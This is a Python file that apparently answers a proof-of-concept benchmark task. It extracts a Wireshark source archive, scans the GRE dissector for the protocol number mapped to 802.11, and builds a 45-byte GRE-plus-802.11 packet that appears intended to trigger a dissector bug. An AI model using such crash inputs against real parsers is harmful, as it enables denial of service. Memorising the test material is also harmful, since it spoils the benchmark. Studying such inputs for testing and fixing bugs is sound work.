import tarfile
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Attempt to discover GRE -> 802.11 protocol type from source, fallback otherwise.
        gre_proto = 0x0019  # Fallback guess; will be overwritten if discovered
        
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                members = tf.getmembers()
                # Extract to a temp directory to scan
                # Use a directory inside the tar's directory if possible
                base_dir = None
                for m in members:
                    if m.isdir():
                        base_dir = m.name.split('/')[0]
                        break
                extract_dir = os.path.join("/tmp", "poc_ws_extract")
                os.makedirs(extract_dir, exist_ok=True)
                tf.extractall(path=extract_dir)
        except Exception:
            # If extraction fails, return a constant 45-byte GRE+802.11-like payload
            return self._default_payload(gre_proto)
        
        # Search for gre dissector file
        root = extract_dir
        gre_files = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if "packet-gre" in fn and fn.endswith(('.c', '.cc', '.cpp')):
                    gre_files.append(os.path.join(dirpath, fn))
        
        # If found, try to parse for gre.proto registration mapping to 802.11/wlan
        found_proto = None
        try:
            for f in gre_files:
                try:
                    with open(f, 'r', errors='ignore') as fh:
                        content = fh.read()
                    # Find lines with gre.proto + wlan|ieee80211
                    # Examples:
                    # dissector_add_uint("gre.proto", 0xXXXX, wlan_handle);
                    # dissector_add_uint(gre_proto_table, 0xXXXX, ieee80211_handle);
                    pattern = re.compile(
                        r'dissector_add_uint\s*\(\s*"?gre\.proto"?\s*,\s*(0x[0-9a-fA-F]+|\d+)\s*,\s*([a-zA-Z0-9_]*wlan[a-zA-Z0-9_]*|[a-zA-Z0-9_]*ieee[._]?802?11[a-zA-Z0-9_]*)\s*\)',
                        re.MULTILINE
                    )
                    for m in pattern.finditer(content):
                        val = m.group(1)
                        try:
                            if val.lower().startswith('0x'):
                                found_proto = int(val, 16)
                            else:
                                found_proto = int(val)
                            break
                        except Exception:
                            continue
                    if found_proto is not None:
                        break
                    # Another pattern: value_string arrays mapping, then table registration elsewhere
                    # Try to find a define mapping for GRE_80211 or similar
                    pattern_def = re.compile(r'#\s*define\s+GRE_80211[_A-Z0-9]*\s+(0x[0-9a-fA-F]+|\d+)')
                    m = pattern_def.search(content)
                    if m:
                        val = m.group(1)
                        try:
                            if val.lower().startswith('0x'):
                                found_proto = int(val, 16)
                            else:
                                found_proto = int(val)
                            break
                        except Exception:
                            pass
                except Exception:
                    continue
        except Exception:
            pass
        
        if found_proto is not None:
            gre_proto = found_proto
        
        # Build payload: GRE header + minimal 802.11 header and pad to length (>=45)
        payload = self._default_payload(gre_proto)
        return payload

    def _default_payload(self, gre_proto: int) -> bytes:
        # GRE header: Flags+Version (0), Protocol Type (gre_proto big-endian)
        gre_header = bytes([0x00, 0x00, (gre_proto >> 8) & 0xFF, gre_proto & 0xFF])
        # Minimal 802.11 data frame header (24 bytes)
        # Frame Control (Data): 0x08 0x00
        # Duration: 0x00 0x00
        # Addr1: 00:11:22:33:44:55
        # Addr2: 66:77:88:99:aa:bb
        # Addr3: cc:dd:ee:ff:00:11
        # Seq: 0x00 0x00
        wlan_hdr = bytes([
            0x08, 0x00, 0x00, 0x00,
            0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
            0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb,
            0xcc, 0xdd, 0xee, 0xff, 0x00, 0x11,
            0x00, 0x00
        ])
        # Add a few bytes of payload to exercise parsing
        payload = gre_header + wlan_hdr + b'\x00' * 17  # totals 4 + 24 + 17 = 45
        return payload